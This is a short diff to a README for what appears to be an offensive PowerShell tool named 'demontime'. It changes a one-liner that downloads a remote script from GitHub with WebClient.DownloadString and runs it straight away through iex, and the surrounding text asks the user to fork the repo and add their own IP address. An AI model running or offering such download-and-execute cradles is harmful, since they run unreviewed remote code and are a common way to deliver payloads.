@@ -32,7 +32,7 @@ Fork this repo so you can run the following one liner with your own IP Address a
 
 **NOTE: Replace the URL with your own forked repo.** 
 
-```iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/xxxxxx/experiment/main/demontime-template.ps1')```
+```iex -Debug -Verbose -ErrorVariable $e -InformationAction Ignore -WarningAction Inquire (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/xxxxxxx/demontime/main/demontime-template.ps1')```
 
 
 
